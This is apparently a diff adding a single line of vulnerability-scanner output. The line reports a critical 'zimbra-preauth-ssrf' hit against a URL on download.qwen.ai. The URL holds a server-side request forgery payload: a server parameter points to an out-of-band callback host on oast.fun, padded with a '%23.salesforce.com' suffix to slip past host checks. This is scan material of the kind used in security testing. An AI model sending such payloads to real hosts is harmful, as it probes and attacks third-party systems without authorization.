@@ -1,0 +1,1 @@
+[zimbra-preauth-ssrf] [http] [critical] https://download.qwen.ai/service/error/sfdc_preauth.jsp?session=s&userid=1&server=http://dbhlfqt46120gd15vomg4yayj93harzzz.oast.fun%23.salesforce.com/
